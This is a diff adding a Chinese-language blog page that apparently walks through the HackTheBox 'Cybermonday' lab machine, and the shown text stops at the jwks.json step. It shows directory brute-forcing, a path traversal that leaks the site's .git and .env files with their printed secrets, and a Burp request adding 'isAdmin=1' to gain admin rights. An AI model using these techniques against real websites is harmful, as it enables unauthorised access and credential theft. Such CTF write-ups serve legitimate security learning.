@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Cybermonday0x1 信息收集nmap只有 80 和 SSH 端口，其他的沒什麽。 123456789python3 dirsearch.py -u http:&#x2F;&#x2F;cybermonday.htb&#x2F; -w  ~&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;quickhits.txt -e php,html,txt   [21:35:21] Starting: [21:35:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Cybermonday">
+<meta property="og:url" content="https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Cybermonday0x1 信息收集nmap只有 80 和 SSH 端口，其他的沒什麽。 123456789python3 dirsearch.py -u http:&#x2F;&#x2F;cybermonday.htb&#x2F; -w  ~&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;quickhits.txt -e php,html,txt   [21:35:21] Starting: [21:35:">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200407-8xkpkjv.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200532-5jb9bli.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200609-ec61r8b.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023224300-hwxx8wy.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023224324-k3ivhm0.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023232128-t59eks5.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023231908-bqidi4m.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023231444-i8xewxk.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023232048-zzvnjqw.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023235031-zllja1f.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023234854-zyinlr8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023235252-gk3sl3u.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024000909-syceab6.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024001926-sz8dj30.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024002107-2w8da8r.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024222937-5vbuhzq.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025190451-jcmm1gh.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025203842-qwrsidr.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025204059-diy69v8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025204127-ntip6tj.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025204249-sjmifw9.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025224405-pszuxyj.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026195659-gexmttm.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026195831-0j5p1fs.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024222346-pw31mew.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200949-1jttzdj.png">
+<meta property="article:published_time" content="2023-10-26T12:09:00.000Z">
+<meta property="article:modified_time" content="2024-02-16T13:28:05.446Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200407-8xkpkjv.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Cybermonday</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/28/2023/2023-10-rid-brute/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/09/08/2023/2023-09-ipv6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&text=HackTheBox - Machine - Cybermonday"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&is_video=false&description=HackTheBox - Machine - Cybermonday"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Cybermonday&body=Check out this article: https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&name=HackTheBox - Machine - Cybermonday&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&t=HackTheBox - Machine - Cybermonday"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Cybermonday
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-26T12:09:00.000Z" class="dt-published" itemprop="datePublished">2023-10-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Cybermonday"><a href="#Cybermonday" class="headerlink" title="Cybermonday"></a>Cybermonday</h1><h2 id="0x1-信息收集"><a href="#0x1-信息收集" class="headerlink" title="0x1 信息收集"></a>0x1 信息收集</h2><p>nmap只有 80 和 SSH 端口，其他的沒什麽。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://cybermonday.htb/ -w  ~/SecLists/Discovery/Web-Content/quickhits.txt -e php,html,txt   </span><br><span class="line"></span><br><span class="line">[21:35:21] Starting: </span><br><span class="line">[21:35:35] 200 -  603B  - /.htaccess                                </span><br><span class="line">[21:36:51] 302 -  358B  - /api/user  -&gt;  http://cybermonday.htb/login   </span><br><span class="line">[21:36:56] 404 -  555B  - /assets/js/fckeditor                      </span><br><span class="line">[21:36:56] 404 -  555B  - /assets/fckeditor                         </span><br><span class="line">[21:36:56] 404 -  555B  - /assets/npm-debug.log</span><br><span class="line">[21:38:43] 200 -    6KB - /login </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># /.htaccess</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    &lt;IfModule mod_negotiation.c&gt;</span><br><span class="line">        Options -MultiViews -Indexes</span><br><span class="line">    &lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Handle Authorization Header</span><br><span class="line">    RewriteCond %&#123;HTTP:Authorization&#125; .</span><br><span class="line">    RewriteRule .* - [E=HTTP_AUTHORIZATION:%&#123;HTTP:Authorization&#125;]</span><br><span class="line"></span><br><span class="line">    # Redirect Trailing Slashes If Not A Folder...</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; (.+)/$</span><br><span class="line">    RewriteRule ^ %1 [L,R=301]</span><br><span class="line"></span><br><span class="line">    # Send Requests To Front Controller...</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteRule ^ index.php [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-一個奇怪的發現"><a href="#0x2-一個奇怪的發現" class="headerlink" title="0x2 一個奇怪的發現"></a>0x2 一個奇怪的發現</h2><p><strong>機器不給掃描</strong>，但是發現了一些細節，在我嘗試强行讓他404的時候，<code>http://cybermonday.htb/assets/xxx</code>​​ 和 <code>http://cybermonday.htb/dashboard/xxx</code>​​ 的結果不一樣，所以猜測 <code>assets</code>​​ 可能做了一些反向代理的事情。如果<code>assets</code>​​ 有反向代理的話，那麽可以嘗試做 <code>Path traversal</code>​​。</p>
+<p>儅訪問 <code>http://cybermonday.htb/assets../.git/</code>​ 出現403，證明是有東西的，<code>http://cybermonday.htb/assets../.git/HEAD</code>​ 返回文件，可以用git dumper之類的工具把他dump下來，然後得到源碼。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python3 /Tools/Tools/Gitdumper/git_dumper.py <span class="string">&#x27;http://cybermonday.htb/assets../.git/&#x27;</span> <span class="built_in">source</span>                                                                                                                                </span><br><span class="line">[-] Testing http://cybermonday.htb/assets../.git/HEAD [200]                                                                                                                                                                    </span><br><span class="line">[-] Testing http://cybermonday.htb/assets../.git/ [403]                                                                                                                                                                        </span><br><span class="line">[-] Fetching common files                                                                                    </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>目錄裏面發現有 <code>.env.example</code>​ ，猜測 <code>.env</code>​ 可能存在服務器上，嘗試 <code>curl http://cybermonday.htb/assets../.env</code>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">APP_NAME=CyberMonday                                  </span><br><span class="line">APP_ENV=local   </span><br><span class="line">APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=                                                    </span><br><span class="line">APP_DEBUG=true            </span><br><span class="line">APP_URL=http://cybermonday.htb                        </span><br><span class="line">                                                      </span><br><span class="line">LOG_CHANNEL=stack                                     </span><br><span class="line">LOG_DEPRECATIONS_CHANNEL=null</span><br><span class="line">LOG_LEVEL=debug   </span><br><span class="line">                                                      </span><br><span class="line">DB_CONNECTION=mysql   </span><br><span class="line">DB_HOST=db                                            </span><br><span class="line">DB_PORT=3306                        </span><br><span class="line">DB_DATABASE=cybermonday                               </span><br><span class="line">DB_USERNAME=root                                      </span><br><span class="line">DB_PASSWORD=root                 </span><br><span class="line">                                                      </span><br><span class="line">BROADCAST_DRIVER=log                                  </span><br><span class="line">CACHE_DRIVER=file              </span><br><span class="line">FILESYSTEM_DISK=local                                 </span><br><span class="line">QUEUE_CONNECTION=sync                              </span><br><span class="line">SESSION_DRIVER=redis                                                                                           </span><br><span class="line">SESSION_LIFETIME=120  </span><br><span class="line">MEMCACHED_HOST=127.0.0.1                              </span><br><span class="line">                                                      </span><br><span class="line">REDIS_HOST=redis          </span><br><span class="line">REDIS_PASSWORD=                                       </span><br><span class="line">REDIS_PORT=6379   </span><br><span class="line">REDIS_PREFIX=laravel_session:                                                                                  </span><br><span class="line">CACHE_PREFIX=             </span><br><span class="line">                                                      </span><br><span class="line">MAIL_MAILER=smtp                                      </span><br><span class="line">MAIL_HOST=mailhog                                     </span><br><span class="line">MAIL_PORT=1025             </span><br><span class="line">MAIL_USERNAME=null</span><br><span class="line">MAIL_PASSWORD=null                                    </span><br><span class="line">MAIL_ENCRYPTION=null  </span><br><span class="line">MAIL_FROM_ADDRESS=&quot;hello@example.com&quot;                 </span><br><span class="line">MAIL_FROM_NAME=&quot;$&#123;APP_NAME&#125;&quot;        </span><br><span class="line">                                                      </span><br><span class="line">AWS_ACCESS_KEY_ID=                                    </span><br><span class="line">AWS_SECRET_ACCESS_KEY=           </span><br><span class="line">AWS_DEFAULT_REGION=us-east-1                          </span><br><span class="line">AWS_BUCKET=                                           </span><br><span class="line">AWS_USE_PATH_STYLE_ENDPOINT=false</span><br><span class="line">                                                      </span><br><span class="line">PUSHER_APP_ID=                                     </span><br><span class="line">PUSHER_APP_KEY=                                                                                                </span><br><span class="line">PUSHER_APP_SECRET=                                                                                             </span><br><span class="line">PUSHER_APP_CLUSTER=mt1                                                                                         </span><br><span class="line">                                                      </span><br><span class="line">MIX_PUSHER_APP_KEY=&quot;$&#123;PUSHER_APP_KEY&#125;&quot;                </span><br><span class="line">MIX_PUSHER_APP_CLUSTER=&quot;$&#123;PUSHER_APP_CLUSTER&#125;&quot;</span><br><span class="line">                                                      </span><br><span class="line">CHANGELOG_PATH=&quot;/mnt/changelog.txt&quot;</span><br><span class="line">                                                                                                               </span><br><span class="line">REDIS_BLACKLIST=flushall,flushdb                      </span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>APP_KEY</code>​​ 和一個 <code>redis</code>​​ ，這裏猜測 <code>redis</code>​​ 是做cookie管理，然後還有一個後面值得探索的 <code>CHANGELOG_PATH</code>​​ 目錄。</p>
+<p>源碼看起來沒有什麽特別的地方。</p>
+<h1 id="0x3-修改密碼的地方好像有點奇怪"><a href="#0x3-修改密碼的地方好像有點奇怪" class="headerlink" title="0x3 修改密碼的地方好像有點奇怪"></a>0x3 修改密碼的地方好像有點奇怪</h1><p>隨便注冊一個用戶密碼，然後修改密碼，用戶名填 <code>admin</code>​​ 郵箱填 <code>admin@cybermonday.htb</code>​​，點擊提交之後會報錯，觀察這個報錯，是一個 <code>Laravel Error Tracking</code>​​ 平臺，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200407-8xkpkjv.png" alt="image">​</p>
+<p>仔細觀察是説SQL出現錯誤，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">update</span><br><span class="line">  `users`</span><br><span class="line">set</span><br><span class="line">  `username` = admin,</span><br><span class="line">  `email` = admin@cybermonday.htb,</span><br><span class="line">  `password` = $ 2y $ 10 $ 2GD8HBeFKTkeFL7KJMVXL1zxWTS1KAT3fACcv3PgTerKwmg8BUrvn,</span><br><span class="line">  `users`.`updated_at` = 2023 -00 -00 00: 00: 00</span><br><span class="line">where</span><br><span class="line">  `id` = 2</span><br></pre></td></tr></table></figure>
+
+<p>下面的 CONTEXT 寫著：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;id&quot;: 2,</span><br><span class="line">    &quot;username&quot;: &quot;xxxx&quot;,</span><br><span class="line">    &quot;email&quot;: &quot;xxxx@xxxx.com&quot;,</span><br><span class="line">    &quot;isAdmin&quot;: true,</span><br><span class="line">    &quot;created_at&quot;: &quot;2023-00-00T00:00:00.000000Z&quot;,</span><br><span class="line">    &quot;updated_at&quot;: &quot;2023-00-00T00:00:00.000000Z&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看起來是從數據庫裏面讀取出來的，也就是說數據庫裏面有一個 <code>isAdmin</code>​ ，所以嘗試用burp截取提交表單，在post後面加上 <code>&amp;isAdmin=1</code>​。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /home/update HTTP/1.1</span><br><span class="line">Host: cybermonday.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 127</span><br><span class="line">Origin: http://cybermonday.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://cybermonday.htb/home/profile</span><br><span class="line">Cookie: xxxxxxxxxxxxxxxxxxx</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">_token=Tfvb4BLkexNuSAz6Syi4UwEQV9tPcu8jk5y85wiL&amp;username=xxx&amp;email=xxx%xxx.com&amp;password=xxx&amp;password_confirmation=xxx&amp;isAdmin=1</span><br></pre></td></tr></table></figure>
+
+<p>然後就獲得了管理權限，上面出現了 <code>Dashboard</code>​。</p>
+<p>另外，登陸完了之後看了一下cookie，有一個 <code>cybermonday_session</code>​ 的東西，好像是 <code>laravel</code>​ 的加密cookie。</p>
+<h2 id="0x4-發現-webhook"><a href="#0x4-發現-webhook" class="headerlink" title="0x4 發現 webhook"></a>0x4 發現 webhook</h2><p>來到 <code>http://cybermonday.htb/dashboard/changelog</code>​ ，也就是點擊 <code>Dashboard</code>​ -&gt; <code>Changelog</code>​ 裏面，發現有webhook，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200532-5jb9bli.png" alt="image">​</p>
+<p>點擊之後，來到了一個域名 <code>http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77</code>​ 。</p>
+<p>隨便在瀏覽器亂打 <code>http://webhooks-api-beta.cybermonday.htb/aaa.php</code>​​ 發現是php的一個服務器。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200609-ec61r8b.png" alt="image">​</p>
+<p>對這個域名進行掃描，發現兩個文件，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[05:00:00] 200 -  602B  - /.htaccess                                 </span><br><span class="line">[05:00:00] 200 -  447B  - /jwks.json</span><br></pre></td></tr></table></figure>
+
+<p>查看 <code>jwks.json</code>​：</p>
